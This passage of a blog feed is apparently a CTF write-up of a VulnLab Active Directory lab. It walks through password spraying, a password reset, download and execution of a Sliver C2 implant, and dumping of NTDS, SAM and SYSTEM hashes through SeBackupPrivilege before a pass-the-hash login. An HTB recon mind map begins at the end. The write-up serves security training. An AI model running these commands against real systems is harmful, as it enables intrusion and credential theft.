dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Teresa Bell,OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;it,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;baby,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
...
&amp;lt;other &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we’ve learned that the initial password for the users is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BabyStart123!&lt;/code&gt;, we can save all the found users under users.txt and try the password against all of them with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netexec&lt;/code&gt; (previously &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netexec smb &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ./users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./passwords.txt 
SMB         10.10.83.68     445    BABYDC           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:BABYDC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:baby.vl&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...
SMB         10.10.10.6      445    BABYDC           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] baby.vl&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;aroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found that the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caroline.robinson&lt;/code&gt; has the status &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_PASSWORD_MUST_CHANGE&lt;/code&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbpasswd.py&lt;/code&gt; from the impacket scripts to change the password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 smbpasswd.py baby.vl/Caroline.Robinson:&lt;span class=&quot;s1&quot;&gt;&apos;BabyStart123!&apos;&lt;/span&gt;@&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newpass&lt;/span&gt; Summer2018!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Password is expired, trying to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;with a null session.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Password was changed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s try to use WinRM to log in to the machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Caroline.Robinson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Summer2018!&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;aroline.Robinson&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;aroline.Robinson&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ..&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
VL&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;root--privilege-escalation&quot;&gt;Root / Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Since I highly dislike &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up &lt;a href=&quot;https://github.com/BishopFox/sliver&quot;&gt;SilverC2&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec$ silversrv

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain fear
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type &apos;help&apos; for options

[*] Check for updates with the &apos;update&apos; command

[server] sliver &amp;gt; generate --mtls tun0:8888
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 39s
[*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, that I have an implant, I’ve transferred it to the server with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\TEMP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iwr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myIp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8000/EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\TEMP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve set up a listener and once I invoke the implant on the machine I will get a session on my server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BabyDC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I’ve started to enumerate the privileges first.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[server] sliver (EXISTING_CROTCH) &amp;gt; getprivs

Privilege Information for EXISTING_CROTCH.exe (PID: 3248)
---------------------------------------------------------

Process Integrity Level: High

Name                            Description                     Attributes
====                            ===========                     ==========
SeMachineAccountPrivilege       Add workstations to domain      Enabled, Enabled by Default
SeBackupPrivilege               Back up files and directories   Enabled, Enabled by Default
SeRestorePrivilege              Restore files and directories   Enabled, Enabled by Default
SeShutdownPrivilege             Shut down the system            Enabled, Enabled by Default
SeChangeNotifyPrivilege         Bypass traverse checking        Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set  Enabled, Enabled by Default
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And I noticed that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeBackupPrivilege&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeRestorePrivilege&lt;/code&gt; privilege enabled, that automatically means that we can abuse those to get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntds.dit,SAM,SYSTEM&lt;/code&gt; files to obtain some hashes that we can use further to escalate our privileges.&lt;/p&gt;

&lt;p&gt;There are a lot of resources for this technique, here are some of my favorite reads:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960&lt;/li&gt;
  &lt;li&gt;https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup&lt;/li&gt;
  &lt;li&gt;https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I created a file on my local system called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl.dsh&lt;/code&gt; which is basically a script file that can execute series of commands, the contents is as follows:&lt;/p&gt;

&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;persistent&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;nowriters&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;volume&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;c&lt;/span&gt;: &lt;span class=&quot;kd&quot;&gt;alias&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;syl&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;create&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;expose&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;%syl%&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;z&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This sets the context to be persistent, so that the shadow copies will be kept after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diskshadow&lt;/code&gt; session is closed. Then we add a shadowcopy of the C:\ drive with the alias &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl&lt;/code&gt;, we create it and we expose it as another drive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Z:&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then we can download the shadow copy of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntds&lt;/code&gt; file using the SilverC2’s interactive mode.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download Z:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we also need the SYSTEM and SAM files, which we can get by invoking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reg&lt;/code&gt; utility.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am c:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem c:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download system
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote 16842752 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 file successfully, 0 files unsuccessfully&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to /home/syl/vulnlab/Baby/system
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download SAM
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote 16842752 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 file successfully, 0 files unsuccessfully&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to /home/syl/vulnlab/Baby/SAM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can extract the hashes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-secretsdump&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/system &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/SAM &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:&amp;lt;HASH&amp;gt;:::
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once we’ve extracted the hash, we can log in to the DC using WinRM.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
VL&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Recently I’ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulnlab. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.</summary></entry><entry><title type="html">Hack The Box - Ambassador [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html" rel="alternate" type="text/html" title="Hack The Box - Ambassador [Medium]" /><published>2023-08-21T00:00:00+03:00</published><updated>2023-08-21T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html">&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot; /&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;
&lt;title&gt;Markmap&lt;/title&gt;
&lt;style&gt;
* {
  margin: 0;
  padding: 0;
}
#mindmap {
  display: block;
  width: 100vw;
  height: 100vh;
}
&lt;/style&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.8.0/styles/default.min.css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/style.css&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;svg id=&quot;mindmap&quot;&gt;&lt;/svg&gt;
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/d3@7.8.5/dist/d3.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/markmap-view@0.15.3/dist/browser/index.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/index.js&quot;&gt;&lt;/script&gt;&lt;script&gt;(r =&gt; {
                setTimeout(r);
              })(() =&gt; {
  const {
    markmap,
    mm
  } = window;
  const {
    el
  } = markmap.Toolbar.create(mm);
  el.setAttribute(&apos;style&apos;, &apos;position:absolute;bottom:20px;right:20px&apos;);
  document.body.append(el);
})&lt;/script&gt;&lt;script&gt;((getMarkmap, getOptions, root, jsonOptions) =&gt; {
          const markmap = getMarkmap();
          window.mm = markmap.Markmap.create(&apos;svg#mindmap&apos;, (getOptions || markmap.deriveOptions)(jsonOptions), root);
        })(() =&gt; window.markmap,null,{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:0,&quot;payload&quot;:{&quot;lines&quot;:[0,1]},&quot;content&quot;:&quot;Ambassador&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[2,3]},&quot;content&quot;:&quot;PORTS&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[4,5]},&quot;content&quot;:&quot;TCP&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[6,7]},&quot;content&quot;:&quot;Discovered open port 3306/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[7,8]},&quot;content&quot;:&quot;MySQL 8.0.30-0ubuntu0.20.04.2&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[8,9]},&quot;content&quot;:&quot;Discovered open port 80/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[9,10]},&quot;content&quot;:&quot;Hugo 0.94.2&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[10,11]},&quot;content&quot;:&quot;http-title: Ambassador Development Server&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[11,12]},&quot;content&quot;:&quot;Discovered open port 22/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[12,13]},&quot;content&quot;:&quot;OpenSSH 8.2p1 Ubuntu 4ubuntu0.5&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[13,14]},&quot;content&quot;:&quot;Discovered open port 3000/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[14,15]},&quot;content&quot;:&quot;HTTP/1.0 302 Found&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[16,17]},&quot;content&quot;:&quot;UDP&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[18,19]},&quot;content&quot;:&quot;None&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[20,21]},&quot;content&quot;:&quot;HTTP 10.10.11.183:80&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[24,25]},&quot;content&quot;:&quot;Content&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[28,29]},&quot;content&quot;:&quot;user: &lt;code&gt;developer&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[31,32]},&quot;content&quot;:&quot;HTTP 10.10.11.183:3000&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[35,36]},&quot;content&quot;:&quot;Content&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[37,38]},&quot;content&quot;:&quot;Unauthorized&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[38,39]},&quot;content&quot;:&quot;Grafana[8.2.0]&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[40,41]},&quot;content&quot;:&quot;Authorized&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[42,43]},&quot;content&quot;:&quot;Data Source - 